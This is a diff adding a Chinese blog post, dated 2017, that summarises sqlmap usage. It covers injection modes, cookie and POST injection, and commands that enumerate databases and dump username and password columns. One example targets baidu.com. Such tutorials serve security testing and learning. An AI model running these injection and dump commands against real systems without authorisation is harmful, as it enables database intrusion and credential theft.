@@ -164,7 +164,260 @@ onmouseup="document.selection.empty()">-->
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-SqlMap的介绍" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SqlMap的使用方法总结
+    </h1>
+  
+
+        
+        <a href="/2017/07/02/SqlMap的介绍/" class="archive-article-date">
+  	<time datetime="2017-07-02T12:50:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-02</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+	
+        <div id="toc" class="article-toc">
+          <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#SqlMap的介绍"><span class="toc-text">SqlMap的介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQLmap的基本用法"><span class="toc-text">SQLmap的基本用法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注入成功后获取数据库的信息"><span class="toc-text">注入成功后获取数据库的信息</span></a></li></ol>
+          <hr/>
+        </div>
+        
+        <h4 id="SqlMap的介绍"><a href="#SqlMap的介绍" class="headerlink" title="SqlMap的介绍"></a><div id="title">SqlMap的介绍</div></h4><blockquote>
+<p>SQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具,其实在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题</p>
+</blockquote>
+<a id="more"></a>
+<p><strong>sqlmap支持五种不同的注入模式：</strong></p>
+<p>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。<br>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。<br>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。<br>4、联合查询注入，可以使用union的情况下的注入。<br>5、堆查询注入，可以同时执行多条语句的执行时的注入。</p>
+<h4 id="SQLmap的基本用法"><a href="#SQLmap的基本用法" class="headerlink" title="SQLmap的基本用法"></a><div id="title">SQLmap的基本用法</div></h4><p><strong>基本格式</strong></p>
+<blockquote>
+<p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1" target="_blank" rel="external">http://www.vuln.cn/post.php?id=1</a>“<br>默认使用level1检测全部数据库类型</p>
+<p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1" target="_blank" rel="external">http://www.vuln.cn/post.php?id=1</a>“  –dbms mysql –level 3<br>指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）</p>
+</blockquote>
+<p><strong>cookie的注入</strong></p>
+<blockquote>
+<p>当程序有防get注入的时候，可以使用cookie注入</p>
+<p>sqlmap -u “<a href="http://www.baidu.com/shownews.asp" target="_blank" rel="external">http://www.baidu.com/shownews.asp</a>“ –cookie “id=11” –level 2（只有level达到2才会检测cookie）</p>
+</blockquote>
+<p><strong>从post数据包中注入</strong></p>
+<blockquote>
+<p>可以使用burpsuite或者temperdata等工具来抓取post包<br>sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql    指定username参数</p>
+</blockquote>
+<h4 id="注入成功后获取数据库的信息"><a href="#注入成功后获取数据库的信息" class="headerlink" title="注入成功后获取数据库的信息"></a><div id="title">注入成功后获取数据库的信息</div></h4><p><strong>获取数据库基本信息</strong></p>
+<blockquote>
+<p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1" target="_blank" rel="external">http://www.vuln.cn/post.php?id=1</a>“  –dbms mysql –level 3 –dbs<br>查询有哪些数据库<br>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1" target="_blank" rel="external">http://www.vuln.cn/post.php?id=1</a>“  –dbms mysql –level 3 -D test –tables<br>查询test数据库中有哪些表<br>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1" target="_blank" rel="external">http://www.vuln.cn/post.php?id=1</a>“  –dbms mysql –level 3 -D test -T admin –columns<br>查询test数据库中admin表有哪些字段<br>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1" target="_blank" rel="external">http://www.vuln.cn/post.php?id=1</a>“  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump<br>dump出字段username与password中的数据</p>
+</blockquote>
+<p><strong>sqlmap详细命令：</strong></p>
+<blockquote>
+<p>–is-dba 当前用户权限（是否为root权限）<br>–dbs 所有数据库<br>–current-db 网站当前数据库<br>–users 所有数据库用户<br>–current-user 当前数据库用户<br>–random-agent 构造随机user-agent<br>–passwords 数据库密码<br>–proxy <a href="http://local:8080" target="_blank" rel="external">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理<br>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
+</blockquote>
+<p><strong>options选项</strong></p>
+<blockquote>
+<p>–version 显示程序的版本号并退出<br>-h, –help 显示此帮助消息并退出<br>-v VERBOSE 详细级别：0-6（默认为1）<br>保存进度继续跑：<br>sqlmap -u “<a href="http://url/news?id=1“" target="_blank" rel="external">http://url/news?id=1“</a> –dbs-o “sqlmap.log” 保存进度<br>sqlmap -u “<a href="http://url/news?id=1“" target="_blank" rel="external">http://url/news?id=1“</a> –dbs-o “sqlmap.log” –resume 恢复已保存进度</p>
+</blockquote>
+<p><strong>Target(目标)：</strong></p>
+<blockquote>
+<p>以下至少需要设置其中一个选项，设置目标URL。<br>-d DIRECT 直接连接到数据库。<br>-u URL, –url=URL 目标URL。<br>-l LIST 从Burp或WebScarab代理的日志中解析目标。<br>-r REQUESTFILE 从一个文件中载入HTTP请求。<br>-g GOOGLEDORK 处理Google dork的结果作为目标URL。<br>-c CONFIGFILE 从INI配置文件中加载选项。</p>
+</blockquote>
+<p><strong>Request（请求）：</strong></p>
+<blockquote>
+<p>这些选项可以用来指定如何连接到目标URL。<br>–data=DATA 通过POST发送的数据字符串<br>–cookie=COOKIE HTTP Cookie头<br>–cookie-urlencode URL 编码生成的cookie注入<br>–drop-set-cookie 忽略响应的Set - Cookie头信息<br>–user-agent=AGENT 指定 HTTP User - Agent头<br>–random-agent 使用随机选定的HTTP User - Agent头<br>–referer=REFERER 指定 HTTP Referer头<br>–headers=HEADERS 换行分开，加入其他的HTTP头<br>–auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)<br>–auth-cred=ACRED HTTP身份验证凭据（用户名:密码）<br>–auth-cert=ACERT HTTP认证证书（key_file，cert_file）<br>–proxy=PROXY 使用HTTP代理连接到目标URL<br>–proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）<br>–ignore-proxy 忽略系统默认的HTTP代理<br>–delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒<br>–timeout=TIMEOUT 等待连接超时的时间（默认为30秒）<br>–retries=RETRIES 连接超时后重新连接的时间（默认3）<br>–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式<br>–safe-url=SAFURL 在测试过程中经常访问的url地址<br>–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</p>
+</blockquote>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>编码不易,且行且珍惜!<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/zhifubao.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/weixin.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PHP</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">MySql</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/PHP/" class="article-tag-list-link color4">PHP</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/07/02/SqlMap的介绍/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2017/07/02/for和foreach在php中的区别/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          for和foreach在PHP中的区别
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/07/02/php错误和异常/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">PHP的错误与异常</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "mjstUtcUPaEVJpt5xt5zWykf-gzGzoHsz",
+            app_key: "4CY7cYn38n302Lor7lqqLoJO",
+            placeholder: "来呀!快活呀!",
+            avatar:"mm"
+        });
+    }
+</script>
+
+    </section>
+ 
+
+  
+
+
 
           </div>
         </div>
